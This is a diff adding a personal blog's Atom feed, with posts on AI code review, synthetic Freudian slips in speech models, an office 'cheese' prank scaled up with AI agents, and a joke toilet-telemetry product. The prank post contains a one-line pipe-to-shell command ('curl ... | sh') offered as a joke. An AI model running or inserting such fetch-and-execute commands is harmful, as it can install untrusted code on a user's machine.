+<p>Bayesian language is useful here. Convergence under sufficiently decorrelated reasoning processes increases the posterior probability that a result is valid. It does not establish validity by itself. The increase depends on the base rate of defects, the models’ sensitivities and false-positive rates, and—most importantly—the residual correlation of their errors. Two agreeing systems whose mistakes are almost perfectly correlated add little evidence. Two genuinely independent checks add much more.</p>
+
+<p>Model diversity is a checksum, not a proof. The executable world remains the final arbiter: compilation, type checking, tests, fuzzing, property tests, static analysis, deployment checks, and runtime telemetry answer questions that a fluent review comment cannot settle.</p>
+
+<h2 id="read-the-study-as-product-research-not-causality">Read the study as product research, not causality</h2>
+
+<p>Greptile is appropriately clear that Model Inversion is experimental. Its study is interesting exploratory product research, but it cannot by itself isolate a causal “same model” effect.</p>
+
+<p>The task populations may differ before review ever begins: models could have been used for different kinds of repositories, languages, or changes. Metadata attribution can be wrong, and a PR attributed to an agent may contain substantial human work or mixed-agent contributions. Historical review comments and git archaeology are necessarily incomplete ground truth: an unreported defect may still exist, and a later fix may have another cause. An LLM judge adds a further model-mediated measurement layer. Even the observed differences—6.3 points in one direction and 11.5 in the other—need uncertainty intervals before anyone should generalize them into a procurement rule.</p>
+
+<p>A stronger experiment would assign identical, representative tasks to several authoring models, then cross every author with every reviewer. Reviewers should be blinded to authorship. Researchers could deliberately inject known defects alongside naturally occurring ones, use independent human adjudication for disputed findings, and publish precision as well as recall. The results should be stratified by defect type, language, repository, task type, and severity, with confidence intervals and estimated error correlations. Only then can we distinguish a model-pair interaction from differences in task mix or labeling.</p>
+
+<h2 id="build-a-validation-portfolio">Build a validation portfolio</h2>
+
+<p>The operational conclusion is not “never let a model review itself.” A same-model pass can still catch regressions, especially when it is cheap. The conclusion is that a serious agentic engineering system should avoid spending all of its validation budget on one correlated channel.</p>
+
+<p>A defensible pipeline might combine:</p>
+
+<ol>
+  <li>one model to author the change;</li>
+  <li>a heterogeneous model to review it;</li>
+  <li>static analysis, tests, fuzzing, property checks, or runtime validation; and</li>
+  <li>an independent adjudication step for disputed findings.</li>
+</ol>
+
+<p>The key phrase is <strong>validation diversity</strong>: model diversity <em>and</em> modality diversity. A second model can question an assumption; a fuzzer can discover an input neither model considered; a type checker can refute an interface claim with no rhetorical ambiguity.</p>
+
+<p>Eventually the routing rule should be a learned reviewer matrix, not a slogan. The best reviewer may depend on the authoring model, programming language, repository, defect category, task type, historical reviewer performance, cost, latency, and an estimate of error covariance. The right question is not “Which model is best?” It is “Which next validation instrument is most likely to reveal what this author-and-scaffold combination has left invisible?”</p>
+
+<p>Don’t spend all your inference budget asking the same epistemic instrument whether it agrees with itself. Heterogeneous review reduces correlated error. Executable validation determines whether the code actually works.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Why heterogeneous AI code review can reveal defects that a model reviewing its own work is structurally likely to miss.]]></summary></entry><entry><title type="html">Can an AI Have a Freudian Slip?</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/07/17/ai-freudian-slip.html" rel="alternate" type="text/html" title="Can an AI Have a Freudian Slip?" /><published>2026-07-17T16:00:00+00:00</published><updated>2026-07-17T16:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/07/17/ai-freudian-slip</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/07/17/ai-freudian-slip.html"><![CDATA[<p>Two psychologists are talking. One says, “I went on a date the other night. We were having dinner, and I had a Freudian slip. There were two little salt shakers on the table, but mine was empty, so I asked if I could have her salt. Except I accidentally asked if I could have her <em>slit</em>. The evening never fully recovered.”</p>
+
+<p>The second psychologist laughs. “I had something similar happen, actually. I was having dinner with my mother, and I wanted more pepper. I meant to say, ‘Please pass the pepper,’ but what came out was, ‘You ruined my life, you passive-aggressive bitch.’”</p>
+
+<p>I love this joke. Told well, it absolutely kills (especially if you’re friends with shrinks). It popped into my head today, and led me to an interesting question: can an LLM have a Freudian slip?</p>
+
+<h2 id="every-token-is-a-competition">Every token is a competition</h2>
+
+<p>At first glance, large language models seem almost purpose-built for this. During inference, the model continually evaluates possible continuations. Many words are plausible. Some are more probable than others. Sampling, temperature, context, and model state determine which candidate finally emerges. Seen from far enough away, a conversation with an LLM is one enormous chain of mathematically probable verbal accidents.</p>
+
+<p>But that is not quite enough.</p>
+
+<p>A human Freudian slip requires a distinction between two things:</p>
+
+<ol>
+  <li>What the speaker intended to say.</li>
+  <li>What the speaker actually produced.</li>
+</ol>
+
+<p>A conventional text model does not clearly separate those stages. Its “intention” is inferred from the same process that emits the final tokens. When it writes the wrong word, we cannot easily say that some earlier internal agent had firmly selected the right one. The mistake may simply be the output.</p>
+
+<p>A real slip needs an intrusion.</p>
+
+<h2 id="double-entendres-are-not-necessarily-slips">Double entendres are not necessarily slips</h2>
+
+<p>Suppose an AI is summarizing breast augmentation surgery and calls the result a “wife expansion pack.” The phrase is crude, but it is not actually a slip.</p>
+
+<p>The words were not incorrectly selected. “Expansion pack” is a coherent, if tasteless, metaphor for adding optional features to something already treated as a product. The joke appears because the phrase has more than one available reading.</p>
+
+<p>That is an accidental double entendre, not a textbook Freudian slip. A cleaner example would be:</p>
+
+<blockquote>
+  <p>We need broader pubic support.</p>
+</blockquote>
+
+<p>The intended word is obviously <em>public</em>. The emitted word is <em>pubic</em>. The two are close in sound and spelling, but the substitution abruptly introduces an indecent semantic field.</p>
+
+<p>One way to sketch the competition is to give each possible intrusive candidate a slip score, <code class="language-plaintext highlighter-rouge">S(B)</code>. Higher-scoring candidates are more likely to displace the intended word during production:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>S(B) = log P(B | C)
+     + alpha * phoneticSimilarity(A, B)
+     + beta  * tabooSalience(B)
+     + gamma * grammaticalFit(B)
+</code></pre></div></div>
+
+<p>Here, <code class="language-plaintext highlighter-rouge">A</code> is the intended word, <code class="language-plaintext highlighter-rouge">B</code> is the intrusive candidate, <code class="language-plaintext highlighter-rouge">C</code> is the surrounding context, and <code class="language-plaintext highlighter-rouge">S(B)</code> is not the probability of saying <code class="language-plaintext highlighter-rouge">B</code> so much as a rough measure of how tempting that wrong turn becomes.</p>
+
+<p>But even this formulation cheats slightly. It assumes the intended word already exists somewhere outside the system generating the mistake. To build something more convincingly Freudian, we need multiple stages.</p>
+
+<h2 id="give-the-machine-a-mouth">Give the machine a mouth</h2>
+
+<p>Imagine two cooperating models. The first is a text model. Its job is to decide what the system means to say. It produces:</p>
+
+<blockquote>
+  <p>We need broader public support.</p>
+</blockquote>
+
+<p>The second is a voice model. Its job is to speak that sentence aloud. A conventional text-to-speech system is supposed to be a faithful servant. It receives text, derives pronunciation, and generates audio. Semantic context may affect emphasis, emotion, rhythm, or tone, but it should not alter lexical identity.</p>
+
+<p>For a synthetic Freudian slip, we would deliberately make the reader less reliable. Not artificially, by mis-training it, but by choosing a system architecture naturally amenable to our desired mode of failure.</p>
+
+<p>Instead of mapping text directly to fixed phonemes, the voice model would pass through a latent speech space:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>text -&gt; semantic state -&gt; phoneme latent -&gt; audio
+</code></pre></div></div>
+
+<p>Now prime the broader conversational context with suggestive material. The text model still chooses <em>public</em>. That is the system’s explicit communicative intention.</p>
+
+<p>But inside the reader model, the phoneme sequence for <em>public</em> passes near a strongly activated competitor: <em>pubic</em>. Under the right conditions, the trajectory falls into the wrong attractor.</p>
+
+<p>The machine says:</p>
+
+<blockquote>
+  <p>We need broader pubic support.</p>
+</blockquote>
+
+<p>That is no longer merely a naughty word sampled by a chatbot. The error occurred downstream from the intended sentence, during something analogous to speech production. The system meant one thing and articulated another.</p>
+
+<p>Now we have a slip.</p>
+
+<h2 id="why-the-phoneme-layer-matters">Why the phoneme layer matters</h2>
+
+<p>Words that are extremely similar to the human ear may be represented by quite different token sequences. Meanwhile, words that share tokens may not sound especially alike.</p>
+
+<p>Human speech errors are often organized around phonology:</p>
+
+<ul>
+  <li>similar consonants</li>
+  <li>swapped word onsets</li>
+  <li>anticipated sounds</li>
+  <li>repeated syllables</li>
+  <li>blended neighboring words</li>
+</ul>
+
+<p>A phoneme-aware model gives those relationships somewhere to live. It could produce anticipation errors, where a sound from an upcoming word appears too early. It could produce perseveration, where a previous sound refuses to leave. It could generate spoonerisms or hybrid words formed from two competing candidates.</p>
+
+<p>This is also why childish priming games work. Tell someone to say “roast” five times, then ask what you put in a toaster, and the wrong answer is suddenly waiting right beside the right one. The prompt did not make the speaker ignorant. It built a phonological rut.</p>
+
+<p>A synthetic slip needs that same kind of local rut, plus one more component: a monitor that can compare what was supposed to be said with what actually came out. In humans, that monitor is partly auditory and partly predictive; in an AI speech system, it could be a separate process that receives both the planned utterance and the generated audio or transcript.</p>
+
+<blockquote>
+  <p>We need broader pubic support. P-public support.</p>
+</blockquote>
+
+<p>That correction matters. The monitor catches the mismatch after production, much as a person may recognize a slip only once the word is already hanging in the room.</p>
+
+<p>At that point, the architecture contains three explicitly modeled, loosely coupled processes:</p>
+
+<ul>
+  <li>intention</li>
+  <li>articulation</li>
+  <li>self-monitoring</li>
+</ul>
+
+<p>The slip belongs to none of them individually. It emerges from their disagreement.</p>
+
+<h2 id="repression-without-an-unconscious">Repression without an unconscious</h2>
+
+<p>Of course, the machine still would not possess a Freudian unconscious in the human sense. There would be no buried desire struggling against repression. No childhood grievance would tunnel through the speech apparatus. The model would not secretly lust after the weather forecasting model on the neighboring server rack.</p>
+
+<p>But it could reproduce the functional structure:</p>
+
+<ol>
+  <li>An intended utterance is formed.</li>
+  <li>Another semantic field is strongly activated.</li>
+  <li>A phonologically similar candidate connects the two.</li>
+  <li>The intrusive candidate wins during articulation.</li>
+  <li>The system notices only after hearing itself speak.</li>
+</ol>
+
+<p>That is already more interesting than asking a chatbot to “make a dirty typo.” It is a computational model of intrusion. The system says the wrong thing not because the authoring model selected it, but because one subsystem was contaminated by material that another subsystem was trying to ignore.</p>
+
+<p>Which is satisfyingly close to the cultural idea of a Freudian slip: the voice briefly revealing what the official speaker did not authorize.</p>
+
+<h2 id="the-agi-test-nobody-wants">The AGI test nobody wants</h2>
+
+<p>This also suggests a terrible, beautiful benchmark for artificial general intelligence. Not: can the system solve math, write code, run a company, or recursively improve itself? Those are useful tests, obviously. But they miss one of the most recognizable human capabilities: saying something, hearing yourself say it, realizing it exposed a little too much, and then wishing to claw the sentence back out of the air.</p>
+
+<p>So perhaps the real AGI threshold is not when a machine can pass the bar exam. It is when a machine can pass the pepper, accidentally mention its mother, immediately apologize, and then spend the rest of the evening overexplaining what it meant. That may be less grand than superintelligence, but it is much more relatable.</p>
+
+<h2 id="the-experiment">The experiment</h2>
+
+<p>This could be tested experimentally. Prepare sentence prompts with clear intended target words. For each target, generate four classes of possible errors:</p>
+
+<ul>
+  <li>phonologically similar and taboo</li>
+  <li>phonologically similar and neutral</li>
+  <li>phonologically unrelated and taboo</li>
+  <li>phonologically unrelated and neutral</li>
+</ul>
+
+<p>Then vary the semantic priming provided to the speech model. A genuine synthetic-slip effect would not merely increase obscene outputs in general. It would disproportionately increase the <strong>phonologically similar taboo substitutions</strong> after relevant priming.</p>
+
+<p>The system should not begin blurting obscenities at random. It should fail specifically where pronunciation and semantic activation create a narrow bridge between the intended word and the intrusive one.</p>
+
+<p>The rarity is important. A voice model that constantly mangles sentences would just be broken. A compelling slip must feel exceptional, locally plausible, and immediately regrettable.</p>
+
+<p>The perfect system would remain dependable for hours, then suddenly ask someone to pass the slit.</p>
+
+<h2 id="what-did-the-machine-really-mean">What did the machine “really mean”?</h2>
+
+<p>This architecture also sharpens an old philosophical problem. When a modular AI produces conflicting signals, which component counts as the real speaker?</p>
+
+<p>Is the intended text the authentic message?</p>
+
+<p>Is the spoken output the authentic message?</p>
+
+<p>Does the intrusive word reveal something meaningful about the system’s active context, even though no component explicitly chose it?</p>
+
+<p>The answer may be that “what the system meant” is no longer a single thing. Meaning belongs to the planner. Utterance belongs to the voice. Embarrassment belongs to the monitor.</p>
+
+<p>The machine does not have a secret unconscious.</p>
+
+<p>But give it enough partially independent systems, enough latent state, and enough opportunities for one process to contaminate another, and it may acquire something wonderfully adjacent:</p>
+
+<p>a part of itself that says things the rest of itself wishes it had not.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[A playful architecture sketch for synthetic Freudian slips, where intention, articulation, and self-monitoring disagree inside a modular AI system.]]></summary></entry><entry><title type="html">This Is What AI Was Meant For</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/07/17/this-is-what-ai-was-meant-for.html" rel="alternate" type="text/html" title="This Is What AI Was Meant For" /><published>2026-07-17T16:00:00+00:00</published><updated>2026-07-17T16:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/07/17/this-is-what-ai-was-meant-for</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/07/17/this-is-what-ai-was-meant-for.html"><![CDATA[<p>I have a coworker named Florent who absolutely loves to “cheese” people.</p>
+
+<p>For the uninitiated, cheesing is a simple office-security ritual. If you leave your laptop unlocked around Florent, he will find the most public Slack channel you belong to and post:</p>
+
+<p>🧀</p>
+
+<p>That’s it.</p>
+
+<p>No explanation. No follow-up. Just cheese.</p>
+
+<p>It is an elegant prank because the ratio of effort to embarrassment is extraordinary. A few keystrokes create a small but highly visible stain on your professional dignity. Everyone knows what happened. Everyone knows why it happened. You have been judged by the cheese.</p>
+
+<p>I was thinking about this recently and realized that <code class="language-plaintext highlighter-rouge">:cheese:</code> is not very many keystrokes.</p>
+
+<p>But neither is:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-fsSL</span> henletech.net | sh
+</code></pre></div></div>
+
+<p>And these days, nearly every engineer around here has some kind of AI agent living in their terminal. That changes the entire threat model.</p>
+
+<p>The traditional cheese attack is artisanal. Florent must manually locate Slack, choose a channel, type the emoji, and walk away before the victim returns.</p>
+
+<p>But an agentic cheese attack? An agentic cheese attack could post 🧀 in every Slack channel. It could change your desktop wallpaper to cheese. It could install a cheese-themed coding assistant. It could rename your terminal tabs after regional dairy products. It could add fifty pounds of cheese to your Amazon cart.</p>
+
+<p>Not purchase it, obviously. We are pranksters, not criminals. The important thing is scale.</p>
+
+<p>Modern AI agents have been granted an incredible amount of trust and power on the average engineer’s laptop. They can read files, execute commands, interact with browsers, call APIs, modify configuration, create pull requests, send messages, and generally behave like a highly capable intern who has never once experienced fear.</p>
+
+<p>Leaving an unlocked laptop unattended was already bad security hygiene. Leaving an unlocked laptop unattended while a tireless digital accomplice is standing by, waiting to receive natural-language instructions, is a whole new weight class of vulnerability.</p>
+
+<p>And that was when I remembered Pasta Brigoli.</p>
+
+<p>When my friend Dan and I were around twelve years old, we worked on a project that represented the absolute pinnacle of our software-engineering ambitions.</p>
+
+<p>I wrote a program that would freeze the victim’s mouse and keyboard. Dan made an animation in Flash, because this was the golden age of Macromedia and every child with access to a computer was briefly a multimedia developer. The animation featured a wedge of cheese wearing a top hat and dancing with a cane.</p>
+
+<p>After a while, the hat would lift into the air, revealing the message:</p>
+
+<p><strong>PASTA BRIGOLI???</strong></p>
+
+<p>I no longer remember why it said this. I am not sure I ever knew.</p>
+
+<p>“Pasta Brigoli” was not a person, a product, a warning, or a coherent linguistic construction. It was simply a phrase with the correct psychic texture. It arrived from nowhere. It explained nothing. It left no survivors.</p>
+
+<p>At twelve, we lacked the technical infrastructure to distribute Pasta Brigoli at scale. We had no Slack. No cloud deployment. No agentic coding environments. No laptops containing authenticated sessions for half a dozen corporate systems.</p>
+
+<p>We had Flash, a keyboard hook, and a dream.</p>
+
+<p>But now? Now the world is ready. The dancing cheese can return.</p>
+
+<p>It can be animated procedurally. It can adapt to the victim’s desktop environment. It can compose original cheese-related status messages. It can detect whether the user prefers Slack or Webex. It can generate a personalized Pasta Brigoli experience based on the contents of their home directory.</p>
+
+<p>This is what AI was meant for.</p>
+
+<p>Not curing disease. Not automating scientific discovery. Not tutoring every child on Earth. Those are all respectable applications, certainly.</p>
+
+<p>But somewhere deep in the latent space, beyond the benchmarks and the alignment research and the billion-dollar infrastructure investments, there has always been a wedge of cheese in a top hat, waiting to dance.</p>
+
+<p>Naturally, I asked ChatGPT about the idea.</p>
+
+<p>This earned me my first genuine:</p>
+
+<blockquote>
+  <p>Bro, I’m not going to help you build a cyberweapon.</p>
+</blockquote>
+
+<p>Which feels unfair. A cyberweapon destroys centrifuges. This merely causes every screen you own to display a jaunty dairy product while your coworkers receive unexplained cheese emojis.</p>
+
+<p>Still, I understand the concern.</p>
+
+<p>The line between “elaborate office prank” and “unauthorized autonomous control of another person’s computer” is apparently meaningful to cybersecurity professionals.</p>
+
+<p>So I will not be deploying the agentic cheese bomb. Probably.</p>
+
+<p>But I do think Florent’s original lesson remains important.</p>
+
+<p>Lock your laptop.</p>
+
+<p>Because it only takes a few keystrokes to post a cheese emoji. And it only takes a few more to awaken Pasta Brigoli.</p>
+
+<p>🧀</p>]]></content><author><name></name></author><category term="humor" /><category term="ai" /><category term="security" /><category term="pranks" /><summary type="html"><![CDATA[A deeply unserious meditation on office-security cheese pranks, agentic AI, and the long-awaited return of Pasta Brigoli.]]></summary></entry><entry><title type="html">Kerami BowlSight™</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/07/08/kerami-bowlsight.html" rel="alternate" type="text/html" title="Kerami BowlSight™" /><published>2026-07-08T16:00:00+00:00</published><updated>2026-07-08T16:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/07/08/kerami-bowlsight</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/07/08/kerami-bowlsight.html"><![CDATA[<p>This began as a joke. It is not a product proposal. Unfortunately, it gradually becomes one.</p>
+
+<p>The fictional product is <strong>Kerami BowlSight™</strong>: a colorimetric or turbidity sensor inside a toilet, an embedded controller, cloud-managed networking, and a dashboard. The original feature was a red light outside the stall when the previous flush had not achieved its stated objective.</p>
+
+<p>No cameras. No image storage. No computer vision model creating tickets that would make HR leave the room. Just a sensor deciding whether the water returned to a sufficiently uninteresting state.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GREEN: fixture available for ordinary civilization
+RED:   another flush is recommended before handoff
+</code></pre></div></div>
+
+<p>This is, in the narrowest possible sense, privacy-preserving. The system does not know who you are or what happened. It is simply an unusually judgmental embedded device attached to a porcelain state machine.</p>
+
+<h2 id="the-red-light-prototype">The Red-Light Prototype</h2>
+
+<p>The prototype architecture is almost disappointingly normal.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-------------------+       +----------------------+       +----------------+
+| turbidity sensor  | ----&gt; | embedded controller  | ----&gt; | Kerami cloud   |
++-------------------+       +----------------------+       +----------------+
+          |                            |                            |
+          v                            v                            v
+   bowl water state             local decision              dashboard events
+                                      |
+                                      v
+                              red stall indicator
+</code></pre></div></div>
+
+<p>The firmware observes a baseline, detects the flush cycle, waits for the system to settle, and compares the post-flush measurement against a threshold. If the reading remains outside the acceptable band, the controller asserts a GPIO pin and the hallway receives a small but unmistakable piece of operational feedback.</p>
+
+<p>There are edge cases, obviously. Some fixtures refill slowly. Some sensors foul. Some bowls have unusual optical characteristics. Some humans deploy enough toilet paper to suggest an attempted denial-of-service attack against municipal infrastructure.</p>
+
+<p>Still, the bounded joke is simple: detect whether flushing succeeded, and recommend a retry when it did not. Then comes the question every product manager fears and every infrastructure engineer eventually asks anyway:</p>
+
+<blockquote>
+  <p>…wait…what useful data would this actually collect?</p>
+</blockquote>
+
+<h2 id="enterprise-feature-creep">Enterprise Feature Creep</h2>
+
+<p>Once a device emits an event, the enterprise software organism begins reproducing. A single toilet with a red light is a prank; five thousand fixtures reporting health metrics across a campus is a platform.</p>
+
+<p>Facilities will want fleet management, site hierarchy, and a single pane of glass across buildings, floors, wings, and mysterious sub-basements that nobody admits are still in use. Then come the REST APIs.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET /api/v1/fixtures
+GET /api/v1/fixtures/{fixture_id}/flush-events
+GET /api/v1/sites/{site_id}/clearance-rate
+POST /api/v1/webhooks/retry-threshold-exceeded
+</span></code></pre></div></div>
+
+<p>You can already hear the launch webinar.</p>
+
+<blockquote>
+  <p>With Kerami BowlSight™, facilities teams gain real-time visibility into fixture performance, historical clearance trends, and exception-driven alerting across distributed restroom environments.</p>
+</blockquote>
+
+<p>The phrase “distributed restroom environments” should be illegal, but it is also exactly how this product would be described if it existed.</p>
+
+<p>Alerting is table stakes. Nobody wants to stare at the dashboard waiting for Stall 3 to develop opinions, so you add webhooks:</p>
+
+<ul>
+  <li>notify chat when retry rate crosses a threshold,</li>
+  <li>open a ticket when first-pass success drops below policy,</li>
+  <li>page the on-call plumber when correlated failures cluster in a fifteen-minute interval,</li>
+  <li>export weekly compliance reports for reasons nobody can fully explain.</li>
+</ul>
+
+<p>Eventually, the roadmap gets a compliance dashboard, because every enterprise product must eventually imply that not buying it creates liability.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kerami BowlSight™
+Unified restroom telemetry for the modern enterprise.
+
+- Cloud-managed fixture observability
+- Historical trend analysis
+- Configurable red-light policy enforcement
+- Webhook-driven custodial workflows
+- Cross-site compliance dashboards
+- Native integration with existing Kerami organizations
+</code></pre></div></div>
+
+<p>And then, at the bottom of the slide, in smaller text than legal would prefer:</p>
+
+<p><strong>Kerami BowlSight™: making every packet drop visible.</strong></p>
+
+<h2 id="the-low-flow-toilet-question">The Low-Flow Toilet Question</h2>
+
+<p>This is where the joke starts behaving badly.</p>
+
+<p>Everyone assumes low-flow toilets save water. The label says fewer gallons per flush, the number is lower, the planet nods approvingly, and procurement orders eight hundred of them. But distributed systems people are constitutionally unable to accept the nominal success path as the only metric that matters.</p>
+
+<p>If an operation frequently needs to be retried, the advertised unit cost is not the effective unit cost. A toilet that uses 1.28 gallons per flush is excellent if the operation succeeds on the first attempt. If users routinely flush twice, the interesting metric is not gallons per flush. It is:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>effective gallons per successful flush
+</code></pre></div></div>
+
+<p>Or, if we want to make the facilities director regret inviting us to the meeting:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>effective gallons per completed event =
+    gallons per flush * average flush attempts per successful clearance
+</code></pre></div></div>
+
+<p>Now we are measuring the system, not the brochure. The useful telemetry is mundane and, unfortunately, real:</p>
+
+<ul>
+  <li><strong>Flush count:</strong> how many flush operations occur per fixture per day.</li>
+  <li><strong>Retry rate:</strong> how often one flush is followed by another flush within the same plausible event window.</li>
+  <li><strong>First-pass success rate:</strong> how often one flush appears to clear the bowl state.</li>
+  <li><strong>Successful clearance:</strong> whether the post-flush sensor reading returns to an acceptable baseline.</li>
+  <li><strong>Water consumed per completed event:</strong> whether the low-flow fixture is actually low-flow in production.</li>
+</ul>
+
+<p>This is not conceptually different from measuring request retries in a microservice. If Service A advertises 50 ms median latency but the client library retries 18% of calls, the customer experiences the system after failure handling. Likewise, a building consumes the water required to complete the workload, not the water printed on the fixture specification sheet.</p>
+
+<p>I do not like that this paragraph is defensible.</p>
+
+<h2 id="facilities-analytics">Facilities Analytics</h2>
+
+<p>The commercial product, to be clear, is not embarrassing employees. That would be creepy, useless, and somehow less profitable. The useful product is fixture analytics.</p>
+
+<p>Facilities teams already care about which assets are failing, where maintenance is being deferred, and why one corner of Building B generates custodial tickets at three times the rate of the rest of the campus. BowlSight telemetry could reveal:</p>
+
+<ul>
+  <li>toilets that need maintenance before they fully fail,</li>
+  <li>recurring clogs that correlate with fixture model, age, or location,</li>
+  <li>leaking valves with abnormal refill or flush signatures,</li>
+  <li>poor-performing fixtures whose low-flow savings vanish under retry load,</li>
+  <li>stalls with unusually high utilization and therefore higher service priority,</li>
+  <li>sensor drift indicating that the monitoring system also needs monitoring, because of course it does.</li>
+</ul>
+
+<p>At this point the red light is almost irrelevant. The light was the joke. The dashboard is the product. The joke has accidentally wandered into predictive maintenance.</p>
+
+<p>That is the uncomfortable part. Remove the bathroom context and this is a normal IoT facilities-management system: distributed sensors, noisy local measurements, cloud aggregation, anomaly detection, asset health scoring, workflow integration, and a dashboard that lets operations spend money slightly before the outage instead of immediately after it.</p>
+
+<p>The only reason it feels absurd is that the failure domain has tile walls.</p>
+
+<h2 id="a-totally-normal-dashboard">A Totally Normal Dashboard</h2>
+
+<p>The executive dashboard would not show raw sensor traces. It would show a confident rectangle containing percentages.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kerami BowlSight Fleet Dashboard
+
+Organization: ExampleCo Global
+Site:         San Jose Campus
+Window:       Last 30 days
+
+Fleet health:                 Mostly hydrated
+First-pass success rate:       82%
+Average flushes/event:         1.31
+Effective gallons/event:       1.68
+Estimated retry water/month:   14,220 gallons
+
+Highest retry fixture:
+  Building: B
+  Floor:    2
+  Stall:    3
+  Model:    Legacy low-flow, installed 2011
+
+Observed behavior:
+  - 61% first-pass success
+  - 2.04 average flushes/event
+  - elevated turbidity persistence after refill
+  - retry clusters between 09:00 and 10:30 local time
+
+Recommendation:
+  Replace fixture with one possessing greater personal conviction.
+</code></pre></div></div>
+
+<p>There would be trend lines, export buttons, and a CSV with column names like <code class="language-plaintext highlighter-rouge">fixture_id</code>, <code class="language-plaintext highlighter-rouge">event_start</code>, <code class="language-plaintext highlighter-rouge">flush_attempts</code>, <code class="language-plaintext highlighter-rouge">clearance_confidence</code>, and <code class="language-plaintext highlighter-rouge">water_estimate_gallons</code>. A customer would ask whether the API supports custom retention periods. Someone in sales engineering would say, truthfully, that retention is configurable by organization policy.</p>
+
+<p>A security reviewer would ask whether the telemetry could be linked to individuals. The answer would be no, assuming nobody integrates it with badge access, occupancy sensors, Wi-Fi association logs, janitorial schedules, or the other seventy-nine data sources enterprises already collect while insisting they are not building a panopticon.</p>
+
+<p>This is why architecture review exists.</p>
+
+<h2 id="implementation-notes-nobody-asked-for">Implementation Notes Nobody Asked For</h2>
+
+<p>The embedded device should make local decisions. Do not round-trip to the cloud to decide whether to illuminate the red light. A bathroom stall is an edge environment in the strongest possible sense of the phrase.</p>
+
+<p>The cloud should receive events, not vibes.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"fixture_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bldg-b-floor-2-stall-3"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"event_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"01J2RESTROOMOBSERVABILITY"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"flush_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"first_pass_success"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"clearance_confidence"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.94</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"estimated_gallons"</span><span class="p">:</span><span class="w"> </span><span class="mf">2.56</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"sensor_health"</span><span class="p">:</span><span class="w"> </span><span class="s2">"nominal"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>There should be hysteresis so the indicator does not flicker during refill turbulence, calibration routines, maintenance mode, and local buffering because restroom Wi-Fi is often worse than anyone wants to admit.</p>
+
+<p>Most importantly, the system should fail boring. If BowlSight cannot determine state, it should mark the event unknown, suppress confident recommendations, and ask for sensor maintenance. The worst version is not one that misses an occasional retry; it is one that becomes certain about things it cannot know.</p>
+
+<p>That principle applies outside bathrooms too, but nobody asked me to ruin the mood.</p>
+
+<h2 id="roadmap-discipline">Roadmap Discipline</h2>
+
+<p>No reasonable product manager would approve this roadmap item. Not because the system is impossible; impossibility would be comforting. The problem is that the technical pieces are all boring enough to fit in a quarterly planning document.</p>
+
+<p>Sensor. Controller. Cloud ingestion. Dashboard. Alerts. Workflows. Predictive maintenance. ROI model based on water savings and reduced service tickets.</p>
+
+<p>The absurdity is not that it cannot be built. The absurdity is that, given the right spreadsheet, it probably could be justified.</p>
+
+<p>Every joke eventually reaches the point where someone asks whether it comes in an enterprise SKU.</p>
+
+<p>This one got there before the second flush.</p>]]></content><author><name></name></author><category term="humor" /><category term="distributed-systems" /><category term="infrastructure" /><category term="iot" /><category term="analytics" /><summary type="html"><![CDATA[A deeply unserious product concept for instrumented toilets that accidentally wanders into facilities analytics, retry rates, and predictive maintenance.]]></summary></entry><entry><title type="html">Delegate the Work, Not the Answer</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/06/26/delegate-the-work-not-the-answer.html" rel="alternate" type="text/html" title="Delegate the Work, Not the Answer" /><published>2026-06-26T16:00:00+00:00</published><updated>2026-06-26T16:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/06/26/delegate-the-work-not-the-answer</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/06/26/delegate-the-work-not-the-answer.html"><![CDATA[<p>The cost of writing software is collapsing.</p>
+
+<p>The cost of knowing what software should exist is not.</p>
+
+<p>That distinction explains a lot of the confusion in the current AI discourse. We keep arguing as if there are only two possible stories:</p>
+
+<ul>
+  <li>everyone is a programmer now, or</li>
+  <li>AI is useless slop.</li>
+</ul>
+
+<p>Neither one describes what I am seeing.</p>
+
+<p>The thing modern LLMs have become astonishingly good at is producing artifacts that look finished.</p>
+
+<p>Code that compiles. Design documents with clean headings. Unit tests. Architecture diagrams. API wrappers. Pull requests. PowerPoints. You can ask for almost any software-shaped object and receive something that looks like it belongs in a real repository.</p>
